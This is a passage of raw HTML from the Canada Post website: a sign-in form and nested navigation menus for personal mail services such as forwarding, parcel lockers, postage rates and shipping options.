                              <a target="_blank" rel="noopener" href="https://www.canadapost-postescanada.ca/cpc/en/tools/undefined" undefined="" class="campaign-cta">undefined</a>
                            </li>
                          </ul>

                          <ul class="main-l1-header undefined">
                            <li class="mobile-main-back">
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/tools/postal-indicia.page#" aria-label="Back to main menu" tabindex="0">Back to main menu </a>
                            </li>
                          </ul>
                          <ul class="main-l2-header undefined">
                            <li class="mobile-main-back">
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/tools/postal-indicia.page#" aria-label="Back to main navigation" tabindex="0"></a>
                            </li>
                            <li class="mobile-sublevel-back">
                              <a class="menu-item-back" href="https://www.canadapost-postescanada.ca/cpc/en/tools/postal-indicia.page#" aria-label="Back">Back </a>
                            </li>

                          </ul>
                        </div>

                        <ul id="mobile-nav-section-log-in" class="menu-log-in-links">

                          <div class="my-account-wrapper">
                            <div class="my-account-form">
                              <form method="post" action="https://sso-osu.canadapost-postescanada.ca/lfe-cap/en/login?stepupId=smb_mode1,consumer,commercial_link,smb_link&amp;sourceUrl=https%3A%2F%2Fwww.canadapost-postescanada.ca%2Fcpc%2Fen%2Ftools%2Fpostal-indicia.page&amp;targetUrl=https%3A%2F%2Fwww.canadapost-postescanada.ca%2Fcpc%2Fen%2Ftools%2Fpostal-indicia.page%3FforceVouchFor%3Dtrue&amp;businessUrl=https%3A%2F%2Fwww.canadapost-postescanada.ca%2Fdash-tableau%2Fen%2F%3FforceVouchFor%3Dtrue" stepup="1" name="headerSISU" class="cpidSignIn sso_form" businessurl="https://www.canadapost.ca/dash-tableau/en/" id="signinFormMobile">
                                <div class="signin-account-container">
                                  <h3 class="signin-header">Access your account</h3>
                                  <label for="username" class="title">Username</label>
                                  <input id="username" placeholder="" name="username" type="text">
                                  <div class="rememberme-wrapper">
                                    <input value="1" id="rememberme" name="rememberme" type="checkbox">
                                    <label for="rememberme">Remember my username on this device</label>
                                  </div>
                                  <label for="password" class="title">Password</label>
                                  <input id="password" placeholder="" name="password" type="password" autocomplete="nope">
                                  <input value="Sign in" class="button" type="submit">
                                  <div class="user-secure">
                                    Forgot <a href="https://sso-osu.canadapost-postescanada.ca/lfe-cap/en/forgot-username?&amp;sourceUrl=https%3A%2F%2Fwww.canadapost-postescanada.ca%2Fcpc%2Fen%2Ftools%2Fpostal-indicia.page&amp;targetUrl=https%3A%2F%2Fwww.canadapost-postescanada.ca%2Fcpc%2Fen%2Ftools%2Fpostal-indicia.page%3FforceVouchFor%3Dtrue&amp;businessUrl=https%3A%2F%2Fwww.canadapost-postescanada.ca%2Fdash-tableau%2Fen%2F%3FforceVouchFor%3Dtrue" class="sso_link" businessurl="https://www.canadapost.ca/dash-tableau/en/" tabindex="0">Username?</a> or
                                    <a href="https://sso-osu.canadapost-postescanada.ca/lfe-cap/en/forgot-password?&amp;sourceUrl=https%3A%2F%2Fwww.canadapost-postescanada.ca%2Fcpc%2Fen%2Ftools%2Fpostal-indicia.page&amp;targetUrl=https%3A%2F%2Fwww.canadapost-postescanada.ca%2Fcpc%2Fen%2Ftools%2Fpostal-indicia.page%3FforceVouchFor%3Dtrue&amp;businessUrl=https%3A%2F%2Fwww.canadapost-postescanada.ca%2Fdash-tableau%2Fen%2F%3FforceVouchFor%3Dtrue" class="sso_link" businessurl="https://www.canadapost.ca/dash-tableau/en/" tabindex="0">Password?</a>
                                  </div>
                                </div>
                                <div class="create-account-container">
                                  <h3 class="signin-header">Register online</h3>
                                  <p class="signup-text-mobile">
                                    Create an online account in a few easy steps!
                                  </p>
                                  <a href="https://sso-osu.canadapost-postescanada.ca/pfe-pap/en/registration?&amp;sourceUrl=https%3A%2F%2Fwww.canadapost-postescanada.ca%2Fcpc%2Fen%2Ftools%2Fpostal-indicia.page&amp;targetUrl=https%3A%2F%2Fwww.canadapost-postescanada.ca%2Fcpc%2Fen%2Ftools%2Fpostal-indicia.page%3FforceVouchFor%3Dtrue&amp;businessUrl=https%3A%2F%2Fwww.canadapost-postescanada.ca%2Fdash-tableau%2Fen%2F%3FforceVouchFor%3Dtrue" stepup="1" class="button sso_link" businessurl="https://www.canadapost.ca/dash-tableau/en/" tabindex="0">Register now</a>
                                </div>
                              </form>
                            </div>
                          </div>
                        </ul>
                        <ul id="mobile-nav-section-signed-in" class="menu-signed-in-links">

                          <li class="auth-link user-nav-wrapper">
                            <h4 class="sso-username">Hello, <strong></strong>
                            </h4>
                            <ul class="sso-user-nav menu--profile-links">
                              <li>
                                <a href="https://www.canadapost-postescanada.ca/dash-tableau/en" class="parent-link">Dashboard</a>
                              </li>
                              <li>
                                <a href="https://www.canadapost-postescanada.ca/pfe2-pap2/en" '="" class="parent-link">My Profile</a></li>
          <li><a href="https://www.canadapost-postescanada.ca/cpotools/apps/ccm/support" class="parent-link">My Support</a></li>
        </ul>
        
      </li>
      <li class="auth-link sign-out"></li>
    
        </ul>
        <ul id="mobile-nav-section-main" class="menu-main-links active" data-sitemap="mainMenu">
          
  <ul>
    <li>
      <a id="mobile-nav-toggle-personal" href="https://www.canadapost-postescanada.ca/cpc/en/tools/postal-indicia.page#" class="my-personal-link cpc-section-toggle parent-link" data-sitemap="personal">Personal</a>
    </li>
    <li>
      <a id="mobile-nav-toggle-business" href="https://www.canadapost-postescanada.ca/cpc/en/tools/postal-indicia.page#" class="my-business-link cpc-section-toggle parent-link" data-sitemap="business">Business</a>
    </li>
    <li class="my-aboutus-list-item">
      <a id="mobile-nav-toggle-our-company" href="https://www.canadapost-postescanada.ca/cpc/en/tools/postal-indicia.page#" class="my-aboutus-link cpc-section-toggle parent-link" data-sitemap="our-company">Our company</a>
    </li><li>
    </li><li>
      <a id="mobile-nav-toggle-shop" href="https://www.canadapost-postescanada.ca/cpc/en/tools/postal-indicia.page#" class="my-shop-link  cpc-section-toggle parent-link" data-sitemap="shop">Store</a>
    </li><li>
    </li><li>
      <a id="mobile-nav-toggle-support" href="https://www.canadapost-postescanada.ca/cpc/en/support.page" class="my-support-link" data-sitemap="support">Support</a>
    </li><li>

  </li></ul>
  
        </ul>
        <ul id="mobile-nav-section-personal" class="menu-primary-links " data-sitemap="personal">
           
      <div class="menu-overview">
      <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal.page?" target="">
      <h3 class="submenu-header">Personal<span class="open-new-window"></span></h3>
      <p>Learn about mailing services for individuals.</p>
      </a>
      </div> 
      
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving.page?" class="parent-link" target="" alt="">Receiving</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving.page?" target="" alt="">
              <h3 class="submenu-header">Receiving<span class="open-new-window"></span></h3>
                <p>Learn about the different ways to receive your mail and packages.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/manage-mail.page?" class="menu-title parent-link" target="" alt="">Manage your mail</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/manage-mail.page?" target="" alt="">
          <h3 class="submenu-header">Manage your mail<span class="open-new-window"></span></h3>
          <p>Learn about residential community mailboxes and moving mail services.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/manage-mail/mail-forwarding.page?" class="parent-link" target="" alt="">Forward your mail</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/manage-mail/mail-forwarding.page?" target="" alt="">
        <h3 class="submenu-header">Forward your mail<span class="open-new-window"></span></h3>
        <p>Forward mail to a new or temporary address.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/manage-mail/mail-forwarding/custom-commercial.page?" class="" target="" alt="">Customized Mail Forwarding for commercial customers</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/manage-mail/mail-forwarding/custom-commercial.page?" target="" alt="">
            <h3 class="submenu-header">Customized Mail Forwarding for commercial customers<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/manage-mail/hold-mail.page?" class="" target="" alt="">Hold your mail</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/manage-mail/hold-mail.page?" target="" alt="">
        <h3 class="submenu-header">Hold your mail<span class="open-new-window"></span></h3>
        <p>Temporarily stop mail delivery to your address.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/manage-mail/epost.page?" class="" target="" alt="">Get bills and statements online (epost)</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/manage-mail/epost.page?" target="" alt="">
        <h3 class="submenu-header">Get bills and statements online (epost)<span class="open-new-window"></span></h3>
        <p>Set up a free account to get bills and statements securely, online.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/alternative-delivery.page?" class="menu-title parent-link" target="" alt="">Alternative delivery options</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/alternative-delivery.page?" target="" alt="">
          <h3 class="submenu-header">Alternative delivery options<span class="open-new-window"></span></h3>
          <p>Learn about receiving mail at the post office and condo parcel lockers.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/alternative-delivery/flexdelivery.page?" class="" target="" alt="">Deliver purchases to post office (FlexDelivery)</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/alternative-delivery/flexdelivery.page?" target="" alt="">
        <h3 class="submenu-header">Deliver purchases to post office (FlexDelivery)<span class="open-new-window"></span></h3>
        <p>Have packages sent to the post office for pickup. </p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/alternative-delivery/post-office-box.page?" class="" target="" alt="">Rent a post office box</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/alternative-delivery/post-office-box.page?" target="" alt="">
        <h3 class="submenu-header">Rent a post office box<span class="open-new-window"></span></h3>
        <p>Rent a secure PO box to receive mail and packages.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/alternative-delivery/parcel-lockers.page?" class="" target="" alt="">Parcel lockers</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/alternative-delivery/parcel-lockers.page?" target="" alt="">
        <h3 class="submenu-header">Parcel lockers<span class="open-new-window"></span></h3>
        <p>Pick up packages from the locker in your condo or apartment building.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/moving-house.page?" class="menu-title " target="" alt="">Moving to a new home</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/moving-house.page?" target="" alt="">
          <h3 class="submenu-header">Moving to a new home<span class="open-new-window"></span></h3>
          <p>Learn about mail forwarding and accessing your new community mailbox.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/track-reperage/en" class="menu-title parent-link" target="" alt="">Track a package</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/track-reperage/en" target="" alt="">
          <h3 class="submenu-header">Track a package<span class="open-new-window"></span></h3>
          <p>Learn about tracking, delivery notice cards and reference numbers.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/automatic-tracking.page?" class="" target="" alt="">Automatic tracking</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/automatic-tracking.page?" target="" alt="">
        <h3 class="submenu-header">Automatic tracking<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/information/app/fpo/personal/findpostoffice" class="menu-title " target="" alt="">Find a post office</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/information/app/fpo/personal/findpostoffice" target="" alt="">
          <h3 class="submenu-header">Find a post office<span class="open-new-window"></span></h3>
          <p></p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/mobile-app.page?" class="menu-title " target="" alt="">Our mobile app</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/mobile-app.page?" target="" alt="">
          <h3 class="submenu-header">Our mobile app<span class="open-new-window"></span></h3>
          <p>Learn about our free app and get package updates on the go. </p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending.page?" class="parent-link" target="" alt="">Sending</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending.page?" target="" alt="">
              <h3 class="submenu-header">Sending<span class="open-new-window"></span></h3>
                <p>View postage rates and shipping services for mail and packages.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/letters-mail.page?" class="menu-title parent-link" target="" alt="">Letters and mail</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/letters-mail.page?" target="" alt="">
          <h3 class="submenu-header">Letters and mail<span class="open-new-window"></span></h3>
          <p>Learn about postage prices and mail sizing.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/letters-mail/postage-rates.page?" class="" target="" alt="">Postage rates</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/letters-mail/postage-rates.page?" target="" alt="">
        <h3 class="submenu-header">Postage rates<span class="open-new-window"></span></h3>
        <p>Mailing prices for domestic and international letters and cards.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/letters-mail/letter-size.page?" class="" target="" alt="">Letter weight and size</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/letters-mail/letter-size.page?" target="" alt="">
        <h3 class="submenu-header">Letter weight and size<span class="open-new-window"></span></h3>
        <p>Measurements for standard and oversized or non-standard mail.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/letters-mail/registered-mail.page?" class="" target="" alt="">Register your mail</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/letters-mail/registered-mail.page?" target="" alt="">
        <h3 class="submenu-header">Register your mail<span class="open-new-window"></span></h3>
        <p>Buy Registered Mail™ to get proof your letter was received.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/letters-mail/custom-stamps.page?" class="" target="" alt="">Create custom stamps</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/letters-mail/custom-stamps.page?" target="" alt="">
        <h3 class="submenu-header">Create custom stamps<span class="open-new-window"></span></h3>
        <p>Design personal stamps for domestic and international mailing.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels.page?" class="menu-title parent-link" target="" alt="">Parcels</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels.page?" target="" alt="">
          <h3 class="submenu-header">Parcels<span class="open-new-window"></span></h3>
          <p>Learn about different shipping services for packages.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/ship-online.page?" class="" target="" alt="">Ship online</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/ship-online.page?" target="" alt="">
        <h3 class="submenu-header">Ship online<span class="open-new-window"></span></h3>
        <p>Create, pay for and print a shipping label online.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/return-labels.page?" class="" target="" alt="">Return your purchase</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/return-labels.page?" target="" alt="">
        <h3 class="submenu-header">Return your purchase<span class="open-new-window"></span></h3>
        <p>Access and print a return shipping label online.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/restrictions.page?" class="parent-link" target="" alt="">View restrictions</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/restrictions.page?" target="" alt="">
        <h3 class="submenu-header">View restrictions<span class="open-new-window"></span></h3>
        <p>Learn about non-mailable and controlled item restrictions by country.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/restrictions/cannabis.page?" class="" target="" alt="">Cannabis</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/restrictions/cannabis.page?" target="" alt="">
            <h3 class="submenu-header">Cannabis<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/restrictions/firearms.page?" class="" target="" alt="">Firearms</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/restrictions/firearms.page?" target="" alt="">
            <h3 class="submenu-header">Firearms<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-canada.page?" class="parent-link" target="" alt="">Compare shipping services in Canada</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-canada.page?" target="" alt="">
        <h3 class="submenu-header">Compare shipping services in Canada<span class="open-new-window"></span></h3>
        <p>Learn about domestic shipping speeds and features.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-canada/regular.page?" class="" target="" alt="">Regular Parcel</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-canada/regular.page?" target="" alt="">
            <h3 class="submenu-header">Regular Parcel<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-canada/xpresspost.page?" class="" target="" alt="">Xpresspost</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-canada/xpresspost.page?" target="" alt="">
            <h3 class="submenu-header">Xpresspost<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-canada/priority.page?" class="" target="" alt="">Priority</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-canada/priority.page?" target="" alt="">
            <h3 class="submenu-header">Priority<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-international.page?" class="parent-link" target="" alt="">Compare international shipping services</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-international.page?" target="" alt="">
        <h3 class="submenu-header">Compare international shipping services<span class="open-new-window"></span></h3>
        <p>Learn about international shipping speeds and features.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-international/small-packet-usa.page?" class="" target="" alt="">Small Packet USA</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-international/small-packet-usa.page?" target="" alt="">
            <h3 class="submenu-header">Small Packet USA<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-international/small-packet-international.page?" class="" target="" alt="">Small Packet International – Air or Surface</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-international/small-packet-international.page?" target="" alt="">
            <h3 class="submenu-header">Small Packet International – Air or Surface<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-international/xpresspost-international.page?" class="" target="" alt="">Xpresspost – International</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-international/xpresspost-international.page?" target="" alt="">
            <h3 class="submenu-header">Xpresspost – International<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-international/xpresspost-usa.page?" class="" target="" alt="">Xpresspost – USA</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-international/xpresspost-usa.page?" target="" alt="">
            <h3 class="submenu-header">Xpresspost – USA<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-international/tracked-packet-international.page?" class="" target="" alt="">Tracked Packet – International</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-international/tracked-packet-international.page?" target="" alt="">
            <h3 class="submenu-header">Tracked Packet – International<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-international/tracked-packet-usa.page?" class="" target="" alt="">Tracked Packet – USA</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-international/tracked-packet-usa.page?" target="" alt="">
            <h3 class="submenu-header">Tracked Packet – USA<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-international/expedited-usa.page?" class="" target="" alt="">Expedited Parcel – USA</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-international/expedited-usa.page?" target="" alt="">
            <h3 class="submenu-header">Expedited Parcel – USA<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-international/international-parcel.page?" class="" target="" alt="">International Parcel – Air or Surface</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-international/international-parcel.page?" target="" alt="">
            <h3 class="submenu-header">International Parcel – Air or Surface<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-international/priority-worldwide.page?" class="" target="" alt="">Priority Worldwide</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/compare-services-international/priority-worldwide.page?" target="" alt="">
            <h3 class="submenu-header">Priority Worldwide<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/information/app/wtz/business/landedCost" class="" target="" alt="">Estimate duties and taxes</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/information/app/wtz/business/landedCost" target="" alt="">
        <h3 class="submenu-header">Estimate duties and taxes<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/information/app/cdc" class="" target="" alt="">Complete customs form</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/information/app/cdc" target="" alt="">
        <h3 class="submenu-header">Complete customs form<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/flat-rate-box.page?" class="" target="" alt="">Flat rate boxes</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/parcels/flat-rate-box.page?" target="" alt="">
        <h3 class="submenu-header">Flat rate boxes<span class="open-new-window"></span></h3>
        <p>Purchase the box and included postage at the post office, ship anytime.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/quick-tools.page?" class="menu-title parent-link" target="" alt="">Access our quick tools</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/quick-tools.page?" target="" alt="">
          <h3 class="submenu-header">Access our quick tools<span class="open-new-window"></span></h3>
          <p>Learn about your favourite shipping tools.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://www.canadapost-postescanada.ca/information/app/far/business/findARate" class="" target="" alt="">Find a rate</a>
